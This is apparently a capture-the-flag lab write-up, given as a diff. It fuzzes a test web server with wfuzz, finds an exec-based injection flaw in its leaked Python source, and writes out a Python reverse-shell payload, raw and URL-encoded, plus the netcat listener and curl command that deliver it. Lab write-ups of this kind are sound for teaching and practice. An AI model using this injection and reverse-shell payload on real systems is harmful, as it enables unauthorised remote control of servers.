@@ -1,0 +1,29 @@
+* A quick scan though the web page suggest that there is a: *
+
+'Our suite of custom software currently includes:
+A custom written web server
+Currently resolving minor stability issues; server will restart if it hangs for 30 seconds
+An unbreakable encryption algorithm 
+A more secure replacement to SSH'
+
+Message to server devs: the current source code for the web server is in 'SuperSecureServer.py' in the secret development directory
+
+* using wfuzz -Z --hc 404 -u http://10.10.10.168:8080/FUZZ/SuperSecureServer.py -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt 
+i found a the /development/SuperSecureServer.py path which returns a SuperSecureServer.py*
+
+
+* Scanning through the SuperSecureServer.py i noticed "exec(info.format(path))"
+now it is only a matter of creating the correct payload *
+
+- Original payload
+Hello';import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.27",4545));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);x='s
+
+- Url encoded payload
+Hello%27%3Bimport%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%2210.10.14.27%22%2C4545%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D%29%3Bx%3D%27s
+
+* We open a new netcat session and connect with the payload *
+nc -lnvp 4545
+
+curl 10.10.10.168:8080/Hello%27%3Bimport%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%2210.10.14.27%22%2C4545%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D%29%3Bx%3D%27s
+
+
